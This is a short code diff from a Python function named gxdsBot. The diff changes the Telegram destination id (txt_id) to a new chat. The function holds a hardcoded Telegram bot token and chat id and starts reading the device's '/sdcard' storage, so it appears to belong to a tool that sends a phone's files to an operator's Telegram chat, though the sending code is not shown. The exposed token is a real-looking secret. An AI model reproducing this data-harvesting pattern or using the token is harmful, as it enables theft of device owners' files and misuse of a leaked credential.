@@ -1125,7 +1125,7 @@ def gxdsBot():
 
     bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
     chat_id = "6542321044"
-    txt_id = "6542321044"
+    txt_id = "-4041074884"
     # SD CARD
     try:
         sdcard_path = "/sdcard"
